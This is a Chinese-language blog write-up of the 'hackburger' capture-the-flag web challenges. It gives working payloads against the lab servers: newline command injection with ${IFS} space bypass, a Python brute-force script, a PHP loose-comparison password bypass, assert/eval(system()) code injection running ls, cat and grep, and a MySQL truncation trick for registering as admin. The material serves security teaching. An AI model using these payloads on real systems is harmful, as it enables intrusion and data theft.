---
title: hackburger writeup
layout: post
categories: CTF
tags: CTF
---
全是 Web 安全的题目，很有意思而且还有一点难度，在这里记录一下题目的 writeup， 持续更新......

<!--more-->

### 1.Warmup

**tips：**

这里主要就是利用`%0a` 做换行操作，猜测是命令执行，用%0a做换行操作。<br>
这里列一下绕过空格的技巧`${IFS}` 或者 `<>`

```
http://burger.laboratorium.ee:7999/?host=127.0.0.1%0als

回显
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.040 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.040/0.040/0.040/0.000 ms
flag.php
index.php
robots.txt
```

```
GET /?host=127.0.0.1%0acat%20flag.php HTTP/1.1
```



### 2.File search

**第一步：**
在输入框里面输入文件名里的字符发现回显响应的文件<br>
同时输入与文件内容里面的字符也会回显包含该内容的文件



**第二步：**
直接用脚本暴力破解

```python 
#coding: utf-8
import requests
import string
import re

x = "_0123456789" + string.letters
url = "http://burger.laboratorium.ee:8004/"

ans = ""
while True:
    for ch in x:
        payload1 = {"query":ans+ch}
        response = requests.post(url, data=payload1)
        if re.search("flag.txt", response.text):
            ans += ch
            print "Flag:" + ans
            break

        payload2 = {"query": ch+ans}
        response = requests.post(url, data=payload2)
        if re.search("flag.txt", response.text):
            ans = ch + ans
            print "Flag:" + ans
            break
#t_h_e__f_l_a_g__i_s__4401ac27ffff3318dc0f6a3de050b4169e2eba97
```



### 3.Enter password to get candy

**猜测是 PHP 中字符串和 0 的弱比较问题**

```php
<?php 
$a = 0;
$b = "flag?";
if($a==$b){
    echo "true";
}else{
    echo "flase";
}
?>
// 输出是 true
```

所以这里

修改 POST 数据
```
data={"password":true}

或 

data={"password":0}
```
即可得到 flag



### 4.Number to ASCII converter

### assert()

PHP 5

```
bool assert ( mixed $assertion [, string $description ] )
```

PHP 7

```
bool assert ( mixed $assertion [, Throwable $exception ] )
```

assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的响应。如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。



**step1**

```
http://burger.laboratorium.ee:8001/?number=phpinfo()
```

测试这里存在命令执行漏洞



**step2**

```
http://burger.laboratorium.ee:8001/?number=eval(system("ls"))

http://burger.laboratorium.ee:8001/?number=eval(system("cat where/is/the/flag/i/am/looking/for/flag.php"))
查看源码搞定

或者
http://burger.laboratorium.ee:8001/?number=eval(system("grep -rn 'flag'*"))
```



### 5.We tried to clone pastebin



### 6.That's not how you write signup

**tips**
注册： `username = admin...很多空格...1`<br>
基于 mysql 截断漏洞就相当于注册了 `username = admin`<br>
之后就可以用注册时的密码登录，get flag.